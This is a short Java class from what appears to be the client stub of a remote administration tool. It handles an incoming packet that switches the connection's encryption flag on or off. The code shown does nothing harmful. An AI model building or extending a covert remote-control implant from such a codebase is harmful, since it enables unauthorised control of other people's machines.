package com.redpois0n.stub.packets.incoming;

import com.redpois0n.stub.Connection;
import com.redpois0n.stub.Main;

public class Packet99Encryption extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Main.encryption = Connection.readBoolean();
	}

}
